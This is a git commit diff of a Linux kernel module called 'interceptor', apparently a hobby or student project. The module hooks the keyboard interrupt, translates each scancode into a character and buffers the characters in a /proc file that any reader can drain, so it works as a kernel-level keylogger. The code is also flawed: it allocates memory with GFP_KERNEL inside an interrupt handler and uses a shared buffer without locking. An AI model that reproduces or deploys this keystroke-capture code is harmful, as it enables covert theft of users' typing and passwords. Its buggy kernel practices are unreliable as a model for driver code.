ec77137a285b9b69ac8ed01b470c1179639f0299
Steven Mackey <stevester94@gmail.com>
2018-12-05 00:52:15 -0800

    Interceptor looking pretty damn good...

--- interceptor/src/interceptor.c
+++ interceptor/src/interceptor.c
@@ -6,29 +6,53 @@
 #include <linux/proc_fs.h>	/* Necessary because we use the proc fs */
 #include <asm/io.h>
 #include <linux/uaccess.h>
+#include <linux/init.h>
+#include <linux/slab.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Robert W. Oliver II");
 MODULE_DESCRIPTION("A simple example Linux module.");
 MODULE_VERSION("0.01");
 
-#define PROCFS_MAX_SIZE		1024
-#define PROCFS_NAME 		"buffer1k"
-
-#define MY_WORK_QUEUE_NAME "WQsched.c"
 
 
 int my_init(void);
 void my_exit(void);
 char translate_scan_code(int);
 ssize_t read_proc(struct file *filp,char *buf,size_t count,loff_t *offp);
+static void work_handler(struct work_struct *work);
 
-// Proc vars 
+/*
+ * Work queue shit
+ */
+#define MY_WORK_QUEUE_NAME "Interceptor_Queue"
+
+static struct workqueue_struct *my_workqueue;
+ 
+struct interceptor_work_struct {
+    struct work_struct work;
+    unsigned char scancode;
+};
+
+
+
+
+/*
+ * Interceptor buffer shit
+ */
+#define  INTERCEPTOR_BUFFER_LEN 1000
 int len,temp;
 char *msg;
+static char interceptor_buffer[INTERCEPTOR_BUFFER_LEN];
+// unsigned int current_buffer_start_index = 0;
+unsigned int current_buffer_size = 0;
 
 
 
+
+/*
+ * /proc shit
+ */
 struct file_operations proc_fops = {
     read:   read_proc
 };
@@ -41,55 +65,76 @@ struct file_operations proc_fops = {
  *  @param filep A pointer to a file object (defined in linux/fs.h)
  *  @param buffer The pointer to the buffer to which this function writes the data
  *  @param len Number of bytes attempted to be read
- *  @param offset Offset is where the file is being read from
+ *  @param offset Offset is where in the file is being read from
  */
-ssize_t read_proc(struct file *filp,char *buf,size_t count,loff_t *offp ) 
+ssize_t read_proc(struct file *filp,char *buf, size_t num_bytes_requested, loff_t *offp ) 
 {
-    printk("Count: %lu", count);
-    if(count>temp)
+    printk("Count: %lu", num_bytes_requested);
+    printk("Offset: %llu: ", *offp);
+    unsigned int num_bytes_to_write = 0;
+
+    if(num_bytes_requested < current_buffer_size)
     {
-        count=temp;
+        num_bytes_to_write = num_bytes_requested;
     }
-    temp=temp-count;
+    else
+    {
+        num_bytes_to_write = current_buffer_size;
+    }
 
-    copy_to_user(buf,msg, count);
+    copy_to_user(buf, interceptor_buffer, num_bytes_to_write);
 
-    if(count==0)
-        temp=len;   
+    current_buffer_size = 0; // We essentially flush the buffer on each read
 
-    return count;
+    return num_bytes_to_write;
 }
 
 
 
-// static struct workqueue_struct *my_workqueue;
 
-/*
-* This will get called by the kernel as soon as it's safe
-* to do everything normally allowed by kernel modules.
-*/
-static void got_char(void *scancode)
+static void work_handler(struct work_struct *work_in)
 {
-    printk(KERN_INFO "Scan Code %x %s.\n",
-    (int)*((char *)scancode) & 0x7F,
-    *((char *)scancode) & 0x80 ? "Released" : "Pressed");
+    struct interceptor_work_struct* interceptor_work = (struct interceptor_work_struct *)work_in;
+    printk("Worker called");
+
+    // printk(KERN_INFO "Scan Code %x %s.\n",
+    // (int)*((char *)scancode) & 0x7F,
+    // *((char *)scancode) & 0x80 ? "Released" : "Pressed");
+
+    unsigned char scancode = interceptor_work->scancode;
+    char translated_character;
+
+    printk("Worker handled scancode: %u", scancode);
+    translated_character = translate_scan_code(scancode);
+    printk("Translated scan code: %c", translated_character);
+
+    if(current_buffer_size < INTERCEPTOR_BUFFER_LEN)
+    {
+        if(translated_character != 0)
+        {
+            interceptor_buffer[current_buffer_size] = translated_character;
+            current_buffer_size++;
+        }
+    }
+    else
+    {
+        printk("Flushing interceptor buffer!");
+        current_buffer_size = 0;
+        interceptor_buffer[current_buffer_size] = translated_character;
+        current_buffer_size++;
+    }
+
+    kfree(interceptor_work);
 }
 
-/*
-* This function services keyboard interrupts. It reads the relevant
-* information from the keyboard and then puts the non time critical
-* part into the work queue. This will be run when the kernel considers it safe.
-*/
+
 irqreturn_t irq_handler(int irq, void *dev_id)
 {
-    /*
-    * This variables are static because they need to be
-    * accessible (through pointers) to the bottom half routine.
-    */
-    static int initialised = 0;
     static unsigned char scancode;
-    static struct work_struct task;
     unsigned char status;
+    
+
+    printk("Interrupt caught");
 
     /*
     * Read keyboard status
@@ -97,18 +142,15 @@ irqreturn_t irq_handler(int irq, void *dev_id)
     status = inb(0x64);
     scancode = inb(0x60);
 
-    // if (initialised == 0) {
-    //     INIT_WORK(&task, got_char, &scancode);
-    //     initialised = 1;
-    // } else {
-    //     PREPARE_WORK(&task, got_char, &scancode);
-    // }
+    // Not sure if this is the best way to do this?
+    struct interceptor_work_struct * interceptor_work;
+    interceptor_work = kmalloc(sizeof(struct interceptor_work_struct), GFP_KERNEL);
 
-    printk("Interrupt handled scancode: %u", scancode);
-    printk("Translated scan code: %c", translate_scan_code(scancode));
+    INIT_WORK(&interceptor_work->work, work_handler);
 
+    interceptor_work->scancode = scancode;
 
-    // queue_work(my_workqueue, &task);
+    queue_work(my_workqueue, &interceptor_work->work);
 
     return IRQ_HANDLED;
 }
@@ -118,24 +160,16 @@ irqreturn_t irq_handler(int irq, void *dev_id)
 */
 int my_init()
 {
-    // my_workqueue = create_workqueue(MY_WORK_QUEUE_NAME);
+    my_workqueue = create_workqueue(MY_WORK_QUEUE_NAME);
 
     proc_create("hello",0,NULL,&proc_fops);
-    msg=" Hello World ";
-    len=strlen(msg);
-    temp=len;
-    printk(KERN_INFO "1.len=%d",len);
-
-    free_irq(1, NULL);
+    
+    // DISABLING FOR NOW
+    // free_irq(1, NULL);
     return request_irq(1,           /* The number of the keyboard IRQ on PCs */
                        irq_handler, /* our handler */
                        IRQF_SHARED, "test_keyboard_irq_handler",
                        (void *)(irq_handler));
-
-
-
-
-    return 0;
 }
 
 /*
@@ -148,7 +182,9 @@ void my_exit()
     * we don't have a way to restore the normal keyboard interrupt so the
     * computer is completely useless and has to be rebooted.
     */
-    free_irq(1, NULL);
+    // free_irq(1, NULL);
+
+    remove_proc_entry("hello",NULL);
 
     return 0;
 }
@@ -192,6 +228,6 @@ char translate_scan_code(int scancode)
         case 48: return 'b';
         case 49: return 'n';
         case 50: return 'm';
-        default: return '_';
+        default: return 0;
     }
 }
